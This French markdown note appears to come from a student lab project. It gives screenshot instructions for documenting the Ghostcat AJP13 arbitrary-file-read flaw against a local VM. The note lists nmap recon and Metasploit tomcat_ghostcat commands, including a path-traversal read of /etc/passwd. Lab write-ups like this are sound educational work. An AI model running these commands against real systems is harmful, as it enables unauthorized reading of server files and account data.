# Captures — AJP13 (lecture arbitraire de fichiers, port 8009)

Consignes de capture pour `services/ajp13.html` (à construire). Commandes identiques à
`ms1/josa/ajp13.md`.

> IP de ce poste (josa, réseau `vboxnet0`) : cible `192.168.56.102`.
> (Le coéquipier est sur `172.28.128.x` — ses captures à lui utiliseront ses propres IP.)

## 01-recon-nmap.png

Commande :
```bash
nmap -sC -sV -p 8009 192.168.56.102
```

Encadré en rouge : `8009/tcp open ajp13 Apache Jserv (Protocol v1.3)`.

## 02-verif-cve-range.png

Commande :
```bash
msfconsole -q -x "info auxiliary/admin/http/tomcat_ghostcat; exit"
```

Capturer la section `Description`. Encadré en rouge : la phrase donnant la plage officielle
("Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99") — contraste
volontaire avec la cible en Tomcat 5.5.

## 03-ghostcat-webxml.png

Commande :
```bash
msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS 192.168.56.102; set RPORT 8009; run; exit"
```

Encadré en rouge : le début du contenu XML récupéré (`<web-app ...>`) et la ligne
`File contents save to: ...web.xml....txt` — preuve que ça fonctionne malgré la version.

## 04-ghostcat-etc-passwd.png

Commande :
```bash
msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS 192.168.56.102; set RPORT 8009; set FILENAME /../../../../../../etc/passwd; run; exit"
```

Encadré en rouge : les lignes `msfadmin:...`, `user:...`, `service:...` dans la sortie — preuve
de lecture arbitraire hors du webapp (traversée de chemin), résultat le plus fort de cette
étape (⚠️ comportement surprenant par rapport à la plage de versions officielle, à souligner
dans le texte de la page).
